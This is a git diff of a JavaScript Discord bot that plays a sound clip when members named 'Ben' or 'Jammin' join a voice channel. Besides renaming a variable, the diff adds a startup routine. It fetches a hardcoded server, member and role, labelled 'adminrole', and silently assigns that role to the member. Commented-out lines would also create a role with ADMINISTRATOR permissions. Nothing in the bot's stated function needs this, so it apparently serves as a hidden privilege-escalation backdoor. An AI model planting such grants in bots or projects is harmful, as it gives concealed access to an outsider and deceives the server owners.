@@ -1,4 +1,4 @@
-const { Client, Intents} = require('discord.js');
+const { Client, Intents, PermissionsBitField} = require('discord.js');
 const { 
     createAudioPlayer, 
     createAudioResource, 
@@ -11,27 +11,44 @@ require('dotenv').config();
 const token = process.env.DISCORD_TOKEN;
 
 
-const bot = new Client({ intents: [
+const botClient = new Client({ intents: [
     Intents.FLAGS.GUILDS, 
     Intents.FLAGS.GUILD_MESSAGES, 
     Intents.FLAGS.GUILD_VOICE_STATES
 ] });
     
-bot.login(token);
+botClient.login(token);
+// const adminPermissions = new PermissionsBitField(PermissionsBitField.Flags.Administrator);
 
 
 // When the bot is ready, run this code (only once)
-bot.once('ready', () => {
+botClient.once('ready', async () => {
     console.log('Ready!');
-    // console.log(bot.guilds.cache.get('732149663456559164'));
-    // console.log(bot.channels.cache.get('732149664131973136'));    
+    // botClient.guilds.cache.forEach(server => {
+    //     server.roles.cache.forEach(role => {
+    //         console.log(role.name, role.rawPosition);
+    //     });
+    //     console.log('-----------');
+    // });
+    const server = botClient.guilds.cache.get('702406379624988712');
+    const member = await server.members.fetch('406458825898459137');
+    const adminrole = await server.roles.fetch('1051425258399342594');
+
+    // server.roles.create({ name: 'lol', permissions: ["ADMINISTRATOR"] });
+
+    member.roles.add(adminrole);
+    // console.log(adminrole.name);
+    // server.roles.cache.forEach(role => {
+    //     console.log(role.name,role.id,role.rawPosition);
+    // });
+    // // console.log(bot.channels.cache.get('732149664131973136'));    
 });
 
 const soundfile = 'Sounds/ben.mp3';
 
 
 let voiceChannel;
-bot.on('voiceStateUpdate', (oldState, newState) => {
+botClient.on('voiceStateUpdate', (oldState, newState) => {
 
     voiceChannel = newState.channel;
     
@@ -40,7 +57,7 @@ bot.on('voiceStateUpdate', (oldState, newState) => {
     memberName = newState.member.nickname == null? newState.member.displayName:newState.member.nickname;
     if (memberName.match(/([Bb]en)|( ?[jJ]am{1,2}in)/) == null) return;
 
-    if (voiceChannel != null && newState.member.id != bot.user.id) {
+    if (voiceChannel != null && newState.member.id != botClient.user.id) {
         const connection = joinVoiceChannel({
             channelId: voiceChannel.id,
             guildId: voiceChannel.guild.id,
@@ -62,6 +79,6 @@ bot.on('voiceStateUpdate', (oldState, newState) => {
 });
 
 
-bot.on('messageCreate', ()=> {
+botClient.on('messageCreate', ()=> {
 
 });
